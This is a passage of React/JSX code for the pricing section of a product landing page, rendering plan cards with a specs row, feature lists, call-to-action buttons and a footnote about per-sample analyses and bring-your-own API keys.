                  }}>
                    {t.tagline}
                  </p>
                </div>

                {/* Inline specs row */}
                <div style={{
                  display: 'grid',
                  gap: 8,
                  paddingTop: 18,
                  paddingBottom: 18,
                  borderTop: `1px solid ${theme.rule}`,
                  borderBottom: `1px solid ${theme.rule}`,
                }}>
                  {[
                    { label: 'Volume', value: t.specs.analyses },
                    { label: 'Sample size', value: t.specs.sample },
                    { label: 'AI', value: t.specs.ai },
                  ].map((s) => (
                    <div key={s.label} style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      gap: 10,
                    }}>
                      <span style={{
                        fontFamily: mono,
                        fontSize: 10.5,
                        letterSpacing: '0.1em',
                        color: muted,
                        textTransform: 'uppercase',
                      }}>
                        {s.label}
                      </span>
                      <span style={{
                        fontSize: 13,
                        color: theme.ink,
                        fontWeight: 600,
                        textAlign: 'right',
                      }}>
                        {s.value}
                      </span>
                    </div>
                  ))}
                </div>

                {/* Feature list */}
                <ul style={{ listStyle: 'none', padding: 0, margin: 0, display: 'grid', gap: 10, flex: 1 }}>
                  {t.features.map((f, fi) => (
                    <li key={fi} style={{
                      display: 'flex',
                      alignItems: 'flex-start',
                      gap: 10,
                      fontSize: 13.5,
                      lineHeight: 1.5,
                      color: theme.inkSoft,
                    }}>
                      <svg width="13" height="13" viewBox="0 0 14 14" fill="none" style={{ flexShrink: 0, marginTop: 3 }}>
                        <path d="M2.5 7.5l2.5 2.5L11.5 4" stroke={theme.brand} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
                      </svg>
                      <span>{f}</span>
                    </li>
                  ))}
                </ul>

                {/* CTA */}
                <button
                  onClick={() => scrollToId('footer-cta')}
                  style={{
                    padding: '12px 18px',
                    borderRadius: 10,
                    fontFamily: 'inherit',
                    fontSize: 13.5,
                    fontWeight: 600,
                    cursor: 'pointer',
                    border: accent ? 'none' : `1px solid ${theme.ink}`,
                    background: accent ? theme.brand : 'transparent',
                    color: accent ? '#fff' : theme.ink,
                    transition: 'background .15s ease, transform .15s ease',
                    display: 'inline-flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    gap: 8,
                    letterSpacing: '-0.01em',
                  }}
                  onMouseEnter={(e) => {
                    e.currentTarget.style.transform = 'translateY(-1px)';
                    if (!accent) e.currentTarget.style.background = theme.ink, e.currentTarget.style.color = theme.bg;
                  }}
                  onMouseLeave={(e) => {
                    e.currentTarget.style.transform = 'translateY(0)';
                    if (!accent) e.currentTarget.style.background = 'transparent', e.currentTarget.style.color = theme.ink;
                  }}
                >
                  {t.cta}
                  <svg width="13" height="13" viewBox="0 0 14 14" fill="none">
                    <path d="M3 7h8m0 0L7.5 3.5M11 7l-3.5 3.5" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </button>
              </div>
            </Reveal>
            );
          })}
        </div>

        <Reveal y={16} delay={250}>
          <div style={{
            marginTop: isMobile ? 28 : 36,
            textAlign: 'center',
            fontFamily: mono,
            fontSize: 11.5,
            letterSpacing: '0.06em',
            color: theme.muted,
          }}>
            One analysis = one uploaded sample. Pro and Team can use Melani-managed models or bring their own API key.
          </div>
        </Reveal>
      </div>
    </div>
  );
}

Object.assign(window, { VAFeatures, VAUseCases, VAWorkflow, VAFaq, VAFooter, VAWorkspace, VACollab, VAPricing });
